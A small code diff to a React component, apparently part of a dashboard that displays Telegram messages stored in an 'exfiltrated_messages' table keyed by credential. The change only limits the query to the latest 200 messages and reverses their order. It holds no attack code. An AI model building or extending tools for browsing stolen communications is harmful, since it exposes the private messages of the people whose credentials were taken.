@@ -14,13 +14,16 @@ export default function ChatWindow({ credential }: { credential: Credential | nu
         if (!credentialId) return;
 
         async function fetchMsgs() {
+            // Load latest 200 messages — prevents unbounded data transfer for active bots.
             const { data } = await supabase
                 .from("exfiltrated_messages")
                 .select("*")
                 .eq("credential_id", credentialId)
-                .order("telegram_msg_id", { ascending: true });
+                .order("telegram_msg_id", { ascending: false })
+                .limit(200);
 
-            if (data) setMessages(data);
+            // Reverse to show oldest-first in the chat view
+            if (data) setMessages(data.reverse());
         }
 
         fetchMsgs();
